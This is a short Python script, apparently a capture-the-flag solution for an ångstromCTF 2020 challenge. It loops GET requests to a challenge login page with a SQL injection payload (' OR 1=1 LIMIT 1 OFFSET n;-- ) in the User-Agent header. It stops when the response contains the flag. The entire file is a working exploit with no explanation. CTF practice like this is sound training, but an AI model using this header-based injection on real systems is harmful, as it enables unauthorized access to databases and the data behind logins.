import requests

i=0
while True:
    p = requests.get("https://agents.2020.chall.actf.co/login", headers={
        "User-Agent": f"' OR 1=1 LIMIT 1 OFFSET {i};-- "
    })

    if "actf" in p.text:
        print(p.text)
        break

    i += 1;
